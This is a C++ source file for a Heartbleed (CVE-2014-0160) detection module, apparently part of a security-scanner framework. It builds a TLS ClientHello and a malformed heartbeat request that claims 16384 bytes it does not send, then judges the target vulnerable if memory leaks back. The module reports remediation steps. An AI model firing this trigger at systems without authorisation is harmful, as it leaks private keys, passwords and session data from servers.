#include "../include/HeartbleedDetector.h"
#include <iostream>
#include <vector>
#include <array>
#include <cstring>
#include <memory>

// Cross-platform socket support (same as EternalBlue)
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
typedef SOCKET socket_t;
#define INVALID_SOCKET_VALUE INVALID_SOCKET
#define SOCKET_ERROR_VALUE SOCKET_ERROR
#define CLOSE_SOCKET(s) closesocket(s)
#define LAST_ERROR WSAGetLastError()
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
typedef int socket_t;
#define INVALID_SOCKET_VALUE -1
#define SOCKET_ERROR_VALUE -1
#define CLOSE_SOCKET(s) close(s)
#define LAST_ERROR errno
#endif

// TLS/SSL Constants
#define TLS_CONTENT_TYPE_HANDSHAKE 0x16
#define TLS_CONTENT_TYPE_HEARTBEAT 0x18
#define TLS_VERSION_1_0 0x0301
#define TLS_VERSION_1_1 0x0302
#define TLS_VERSION_1_2 0x0303
#define TLS_HANDSHAKE_CLIENT_HELLO 0x01
#define TLS_HEARTBEAT_REQUEST 0x01

// Simple Socket wrapper (minimal version of EternalBlue's Socket class)
class SimpleSocket {
private:
    socket_t sock;
    
public:
    SimpleSocket() : sock(INVALID_SOCKET_VALUE) {
#ifdef _WIN32
        static bool wsaInitialized = false;
        if (!wsaInitialized) {
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            wsaInitialized = true;
        }
#endif
    }
    
    ~SimpleSocket() {
        if (sock != INVALID_SOCKET_VALUE) {
            CLOSE_SOCKET(sock);
        }
    }
    
    bool connect(const std::string& host, int port) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET_VALUE) {
            return false;
        }
        
        // Set timeout
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
#ifdef _WIN32
        DWORD timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
#else
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif
        
        // Resolve address
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        
        // Try to parse as IP first
        if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) != 1) {
            // Not an IP, try DNS resolution
            struct hostent* he = gethostbyname(host.c_str());
            if (!he) {
                return false;
            }
            memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        }
        
        // Connect
        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR_VALUE) {
            return false;
        }
        
        return true;
    }
    
    int send(const void* data, size_t len) {
        return ::send(sock, (const char*)data, (int)len, 0);
    }
    
    int recv(void* data, size_t len) {
        return ::recv(sock, (char*)data, (int)len, 0);
    }
    
    bool isValid() const {
        return sock != INVALID_SOCKET_VALUE;
    }
};

// TLS Record structure
struct TLSRecord {
    uint8_t contentType;
    uint16_t version;
    uint16_t length;
    std::vector<uint8_t> data;
};

// Heartbleed Detector Implementation
class HeartbleedExploit {
public:
    // Create TLS Client Hello packet
    static std::vector<uint8_t> createClientHello() {
        std::vector<uint8_t> packet;
        
        // TLS Record Header
        packet.push_back(TLS_CONTENT_TYPE_HANDSHAKE);  // Content Type: Handshake
        packet.push_back(0x03); packet.push_back(0x02); // Version: TLS 1.1
        packet.push_back(0x00); packet.push_back(0xdc); // Length (220 bytes)
        
        // Handshake Protocol
        packet.push_back(TLS_HANDSHAKE_CLIENT_HELLO);  // Handshake Type: Client Hello
        packet.push_back(0x00); packet.push_back(0x00); packet.push_back(0xd8); // Length
        
        // Client Version: TLS 1.2
        packet.push_back(0x03); packet.push_back(0x03);
        
        // Random (32 bytes) - timestamp + random bytes
        uint32_t timestamp = (uint32_t)time(NULL);
        packet.push_back((timestamp >> 24) & 0xFF);
        packet.push_back((timestamp >> 16) & 0xFF);
        packet.push_back((timestamp >> 8) & 0xFF);
        packet.push_back(timestamp & 0xFF);
        
        // Random bytes (28 bytes)
        for (int i = 0; i < 28; i++) {
            packet.push_back(rand() & 0xFF);
        }
        
        // Session ID Length: 0
        packet.push_back(0x00);
        
        // Cipher Suites Length: 76 bytes
        packet.push_back(0x00); packet.push_back(0x4c);
        
        // Cipher Suites (common ones)
        uint16_t ciphers[] = {
            0xc014, 0xc00a, 0x0039, 0x0038, 0x0088, 0x0087, 0xc00f, 0xc005,
            0x0035, 0x0084, 0xc012, 0xc008, 0x0016, 0x0013, 0xc00d, 0xc003,
            0x000a, 0xc013, 0xc009, 0x0033, 0x0032, 0x009a, 0x0099, 0x0045,
            0x0044, 0xc00e, 0xc004, 0x002f, 0x0096, 0x0041, 0x0007, 0xc011,
            0xc007, 0xc00c, 0xc002, 0x0005, 0x0004, 0x00ff
        };
        
        for (auto cipher : ciphers) {
            packet.push_back((cipher >> 8) & 0xFF);
            packet.push_back(cipher & 0xFF);
        }
        
        // Compression Methods Length: 1
        packet.push_back(0x01);
        // Compression Method: null
        packet.push_back(0x00);
        
        // Extensions Length
        packet.push_back(0x00); packet.push_back(0x49);
        
        // Extension: Heartbeat
        packet.push_back(0x00); packet.push_back(0x0f); // Type: heartbeat
        packet.push_back(0x00); packet.push_back(0x01); // Length: 1
        packet.push_back(0x01); // Mode: peer_allowed_to_send
        
        // Extension: Server Name (SNI)
        packet.push_back(0x00); packet.push_back(0x00); // Type: server_name
        packet.push_back(0x00); packet.push_back(0x0e); // Length: 14
        packet.push_back(0x00); packet.push_back(0x0c); // Server Name List Length: 12
        packet.push_back(0x00); // Server Name Type: host_name
        packet.push_back(0x00); packet.push_back(0x09); // Server Name Length: 9
        // "localhost"
        packet.push_back('l'); packet.push_back('o'); packet.push_back('c');
        packet.push_back('a'); packet.push_back('l'); packet.push_back('h');
        packet.push_back('o'); packet.push_back('s'); packet.push_back('t');
        
        // Extension: Signature Algorithms
        packet.push_back(0x00); packet.push_back(0x0d); // Type: signature_algorithms
        packet.push_back(0x00); packet.push_back(0x20); // Length: 32
        packet.push_back(0x00); packet.push_back(0x1e); // Signature Hash Algorithms Length: 30
        
        // Common signature algorithms
        uint8_t sigAlgs[] = {
            0x06, 0x01, 0x06, 0x02, 0x06, 0x03, 0x05, 0x01, 0x05, 0x02, 0x05, 0x03,
            0x04, 0x01, 0x04, 0x02, 0x04, 0x03, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03,
            0x02, 0x01, 0x02, 0x02, 0x02, 0x03
        };
        
        for (auto alg : sigAlgs) {
            packet.push_back(alg);
        }
        
        // Extension: Renegotiation Info
        packet.push_back(0xff); packet.push_back(0x01); // Type: renegotiation_info
        packet.push_back(0x00); packet.push_back(0x01); // Length: 1
        packet.push_back(0x00); // Renegotiated Connection Length: 0
        
        return packet;
    }
    
    // Create malicious Heartbeat request
    static std::vector<uint8_t> createHeartbeatRequest(uint16_t payloadLength = 16384) {
        std::vector<uint8_t> packet;
        
        // TLS Record Header
        packet.push_back(TLS_CONTENT_TYPE_HEARTBEAT);  // Content Type: Heartbeat
        packet.push_back(0x03); packet.push_back(0x02); // Version: TLS 1.1
        packet.push_back(0x00); packet.push_back(0x03); // Length: 3 bytes
        
        // Heartbeat Request
        packet.push_back(TLS_HEARTBEAT_REQUEST);  // Type: Request
        
        // Payload Length (MALICIOUS - claim more than we send)
        packet.push_back((payloadLength >> 8) & 0xFF);
        packet.push_back(payloadLength & 0xFF);
        
        // No actual payload (this is the vulnerability!)
        // The server will read beyond the buffer trying to echo back 'payloadLength' bytes
        
        return packet;
    }
    
    // Check if response contains leaked memory
    static bool isVulnerable(const std::vector<uint8_t>& response) {
        if (response.size() < 5) {
            return false;
        }
        
        // Check if it's a Heartbeat response
        if (response[0] != TLS_CONTENT_TYPE_HEARTBEAT) {
            return false;
        }
        
        // Get the length from TLS record
        uint16_t recordLength = (response[3] << 8) | response[4];
        
        // If we got back more data than we sent, it's vulnerable
        // (server is leaking memory)
        if (recordLength > 3 && response.size() > 10) {
            return true;
        }
        
        return false;
    }
    
    // Perform Heartbleed detection
    static bool detectHeartbleed(const std::string& target, int port = 443) {
        SimpleSocket socket;
        
        // Connect to target
        if (!socket.connect(target, port)) {
            return false;
        }
        
        // Send Client Hello
        auto clientHello = createClientHello();
        if (socket.send(clientHello.data(), clientHello.size()) <= 0) {
            return false;
        }
        
        // Receive Server Hello and other handshake messages
        std::vector<uint8_t> response(16384);
        int bytesRead = socket.recv(response.data(), response.size());
        
        if (bytesRead <= 0) {
            return false;
        }
        
        // Wait a bit for handshake to complete
#ifdef _WIN32
        Sleep(100);
#else
        usleep(100000);
#endif
        
        // Send malicious Heartbeat request
        auto heartbeat = createHeartbeatRequest(16384);
        if (socket.send(heartbeat.data(), heartbeat.size()) <= 0) {
            return false;
        }
        
        // Receive Heartbeat response
        response.clear();
        response.resize(16384);
        bytesRead = socket.recv(response.data(), response.size());
        
        if (bytesRead <= 0) {
            return false;
        }
        
        response.resize(bytesRead);
        
        // Check if vulnerable
        return isVulnerable(response);
    }
};

// ModuleResult implementation
ModuleResult HeartbleedDetector::run(const MockTarget& target) {
    // Check if target has HTTPS service
    if (!target.isServiceOpen("HTTPS") && !target.isServiceOpen("SSL")) {
        return ModuleResult{
            "HeartbleedDetector",
            false,
            "HTTPS/SSL service not available on target",
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }
    
    // Get target IP
    std::string targetIp = target.id();
    if (target.ip().has_value()) {
        targetIp = target.ip().value();
    }
    
    try {
        std::string details = "Testing for Heartbleed (CVE-2014-0160) vulnerability\n";
        details += "Target: " + targetIp + ":443\n";
        details += "Method: Malformed TLS Heartbeat request\n\n";
        
        // Perform actual Heartbleed detection
        bool vulnerable = HeartbleedExploit::detectHeartbleed(targetIp, 443);
        
        if (vulnerable) {
            details += "VULNERABLE: Server is leaking memory!\n";
            details += "Affected versions: OpenSSL 1.0.1 through 1.0.1f\n";
            details += "Impact: Allows reading up to 64KB of server memory per request\n";
            details += "Risk: Private keys, passwords, and sensitive data can be stolen\n";
            details += "\nRemediation:\n";
            details += "1. Update OpenSSL to 1.0.1g or later\n";
            details += "2. Regenerate SSL certificates and private keys\n";
            details += "3. Reset all passwords and session tokens\n";
            details += "4. Notify affected users\n";
            
            return ModuleResult{
                "HeartbleedDetector",
                true,
                "Target is VULNERABLE to Heartbleed (CVE-2014-0160)",
                details,
                Severity::Critical,
                target.id()
            };
        } else {
            details += "NOT VULNERABLE: Server properly validates Heartbeat requests\n";
            details += "The server either:\n";
            details += "- Is running a patched version of OpenSSL\n";
            details += "- Does not support the Heartbeat extension\n";
            details += "- Has Heartbeat disabled\n";
            
            return ModuleResult{
                "HeartbleedDetector",
                false,
                "Target is not vulnerable to Heartbleed",
                details,
                Severity::Low,
                target.id()
            };
        }
    }
    catch (const std::exception& ex) {
        return ModuleResult{
            "HeartbleedDetector",
            false,
            std::string("Exception during Heartbleed scan: ") + ex.what(),
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }
}
